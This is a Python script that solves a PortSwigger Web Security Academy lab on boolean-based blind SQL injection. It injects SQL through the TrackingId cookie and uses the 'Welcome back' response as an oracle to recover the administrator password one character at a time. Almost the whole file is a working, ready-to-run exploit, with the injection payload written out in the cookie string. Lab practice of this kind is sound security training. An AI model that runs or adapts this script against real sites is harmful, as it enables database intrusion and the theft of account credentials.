#!/usr/bin/env python3
"""
Blind SQL Injection - Boolean-Based Password Extraction
PortSwigger Web Security Academy Lab

Exploits a boolean-based blind SQLi in the TrackingId cookie to extract
the administrator password one character at a time using a 'Welcome back'
oracle response.
"""
import argparse
import sys
import requests

CHARSET = "abcdefghijklmnopqrstuvwxyz0123456789"
MAX_POSITIONS = 20


def extract_password(url: str, session: str, tracking_id: str) -> str:
    password = ""
    target = url.rstrip("/") + "/filter?category=Gifts"
    print(f"[*] Target: {target}")
    print(f"[*] Extracting administrator password ({MAX_POSITIONS} chars max)...\n")

    for position in range(1, MAX_POSITIONS + 1):
        found = False
        for char in CHARSET:
            cookie = (
                f"TrackingId={tracking_id}' AND SUBSTRING("
                f"(SELECT password FROM users WHERE username='administrator')"
                f",{position},1)='{char}'--; session={session}"
            )
            r = requests.get(target, headers={"Cookie": cookie}, timeout=10)
            if "Welcome back" in r.text:
                password += char
                print(f"  Position {position:02d}: {char}  →  {password}")
                found = True
                break

        if not found:
            print(f"\n[*] No match at position {position} — password extraction complete.")
            break

    return password


def main():
    parser = argparse.ArgumentParser(
        description="Boolean-based blind SQLi password extractor (PortSwigger lab)"
    )
    parser.add_argument("--url", default="https://yourlab.web-security-academy.net/",
                        help="Lab URL (include trailing slash)")
    parser.add_argument("--session", default="your_session_cookie",
                        help="Value of the session cookie from browser DevTools")
    parser.add_argument("--tracking-id", default="your_tracking_id",
                        help="Existing TrackingId value from browser DevTools")
    args = parser.parse_args()

    if "yourlab" in args.url or args.session == "your_session_cookie":
        print("[!] Update --url, --session, and --tracking-id before running.")
        print("    Example:")
        print("      python3 scripts/10_blind_sqli.py \\")
        print("        --url https://LABID.web-security-academy.net/ \\")
        print("        --session <session_value> \\")
        print("        --tracking-id <TrackingId_value>")
        sys.exit(1)

    password = extract_password(args.url, args.session, args.tracking_id)
    print(f"\n[+] Password: {password}")


if __name__ == "__main__":
    main()
